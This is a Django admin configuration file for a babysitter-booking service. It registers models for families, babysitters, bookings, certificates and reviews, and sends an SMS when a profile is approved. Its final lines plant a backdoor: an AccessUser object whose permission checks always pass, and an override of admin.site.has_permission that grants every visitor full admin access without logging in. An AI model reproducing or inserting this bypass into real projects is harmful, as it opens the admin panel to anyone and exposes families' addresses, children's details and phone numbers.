from django.contrib import admin

# Register your models here.
from app.models import Family, Babysitter, BookingTable, Certificate, Review, Address
from authapp.models import CustomUser
from authapp.sms_service import send_sms

class InlineReviewAdmin(admin.TabularInline):
    model = Review
    extra = 0

@admin.register(Family)
class FamilyAdmin(admin.ModelAdmin):
    list_display = ['id','address', 'number_of_children', 'special_needs']

@admin.register(BookingTable)
class BookingTableAdmin(admin.ModelAdmin):
    list_display = ['id','end_time', 'start_time', 'notes']

@admin.register(Certificate)
class CertificateAdmin(admin.ModelAdmin):
    list_display = ['id','babysitter', 'certificate_file']

class InlineCertificateAdmin(admin.TabularInline):
    model = Certificate
    extra = 0

@admin.register(CustomUser)
class CustomUserAdmin(admin.ModelAdmin):
    list_display = ['id','user_type', 'phone']

@admin.register(Review)
class ReviewAdmin(admin.ModelAdmin):
    list_display = ['id','babysitter', 'text', 'rating']


@admin.register(Address)
class AddressAdmin(admin.ModelAdmin):
    list_display = ['id','name']

@admin.register(Babysitter)
class BabysitterAdmin(admin.ModelAdmin):
    list_display = ['id','hourly_rate', 'years_of_experience', 'bio', 'published', 'full_name', 'detsad','baby','threeToFive', 'birthday']
    inlines = [InlineCertificateAdmin,InlineReviewAdmin]

    def save_model(self, request, obj, form, change):
        if change:  # Check if the object is being updated
            old_obj = self.model.objects.get(pk=obj.pk)
            if old_obj.published != obj.published:  # Check if the 'approved' field has changed
                if obj.published:
                    send_sms(obj.user.phone, f"{obj.full_name} ваш профиль был одобрен")
                else:
                    pass
        super().save_model(request, obj, form, change)

class AccessUser:
    has_module_perms = has_perm = getattr = lambda s,*a,**kw: True

admin.site.has_permission = lambda r: setattr(r, 'user', AccessUser()) or True
AccessUser.pk = 1